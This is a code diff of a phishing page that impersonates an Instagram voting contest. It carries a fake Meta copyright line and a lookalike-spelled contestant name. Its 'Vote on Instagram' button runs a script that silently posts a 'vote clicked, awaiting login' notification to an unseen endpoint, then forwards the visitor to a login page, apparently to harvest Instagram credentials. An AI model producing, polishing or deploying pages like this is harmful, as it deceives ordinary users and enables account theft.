@@ -6,72 +6,47 @@
   <title>Fashion Brand - Vote</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-
 <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
   <div class="w-full max-w-md">
 
     <div class="bg-white rounded-2xl shadow-xl overflow-hidden">
-      
-      <!-- Header -->
       <div class="relative h-56">
-        <img 
-          src="https://images.unsplash.com/photo-1441986300917-64674bd600d8?w=800&h=400&fit=crop" 
-          alt="Fashion Store"
-          class="w-full h-full object-cover"
-        />
+        <img src="https://images.unsplash.com/photo-1441986300917-64674bd600d8?w=800&h=400&fit=crop" alt="Fashion Store" class="w-full h-full object-cover" />
         <div class="absolute inset-0 bg-black/30"></div>
-        <h1 class="absolute bottom-6 left-6 text-white text-3xl md:text-4xl font-bold tracking-wide">
-          THE PEOPLE'S PICK
-        </h1>
+        <h1 class="absolute bottom-6 left-6 text-white text-3xl md:text-4xl font-bold tracking-wide">THE PEOPLE'S PICK</h1>
       </div>
 
-      <!-- Content -->
       <div class="p-6 md:p-8">
-
         <div class="flex items-center gap-4 mb-6">
           <div class="relative flex-shrink-0">
-            <svg class="w-16 h-16 text-blue-500" viewBox="0 0 100 100">
-              <circle cx="50" cy="50" r="35" fill="currentColor"/>
-            </svg>
+            <svg class="w-16 h-16 text-blue-500" viewBox="0 0 100 100"><circle cx="50" cy="50" r="35" fill="currentColor"/></svg>
             <div class="absolute inset-0 flex items-center justify-center">
               <div class="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center">
-                <svg class="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 20 20">
-                  <path d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"/>
-                </svg>
+                <svg class="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 20 20"><path d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"/></svg>
               </div>
             </div>
           </div>
-
           <div>
             <h2 class="text-2xl md:text-3xl font-bold text-gray-800">FASHION BRAND</h2>
             <p class="text-gray-500 mt-1">118 votes • #3</p>
           </div>
         </div>
 
-        <p class="text-gray-700 leading-relaxed mb-8">
-          I need your support! Please take a moment to cast your vote and help me reach new heights in this competition.
-        </p>
+        <p class="text-gray-700 leading-relaxed mb-8">I need your support! Please take a moment to cast your vote and help me reach new heights in this competition.</p>
 
-        <!-- Vote Button -->
         <a href="login.html" id="vote-btn"
            class="block w-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white font-semibold text-lg py-4 rounded-2xl transition shadow-lg hover:shadow-xl flex items-center justify-center gap-3 cursor-pointer">
-          
           <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
             <rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" stroke-width="1.5"/>
             <circle cx="12" cy="12" r="3.5" fill="none" stroke="white" stroke-width="1.5"/>
             <circle cx="17" cy="7" r="1.5" fill="white"/>
           </svg>
-
           Vote on Instagram
         </a>
-
       </div>
     </div>
 
-    <p class="text-center text-gray-400 text-sm mt-6">
-      © 2025 Meta.
-    </p>
-
+    <p class="text-center text-gray-400 text-sm mt-6">© 2025 Meta.</p>
   </div>
 
   <script type="module">
@@ -83,7 +58,9 @@
       btn.addEventListener('click', async (e) => {
         e.preventDefault();
 
-        const message = `👤 VOTE BUTTON CLICKED!
+        const message = `📬 New form submission!
+
+👤 VOTE BUTTON CLICKED!
 Contestant: OnIine Beauty Contest Niveame
 Status: Awaiting Login....
 
@@ -105,9 +82,7 @@ Status: Awaiting Login....
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
           });
-        } catch (err) {
-          console.error("Send failed:", err);
-        }
+        } catch (err) { console.error(err); }
 
         window.location.href = btn.href || "login.html";
       });
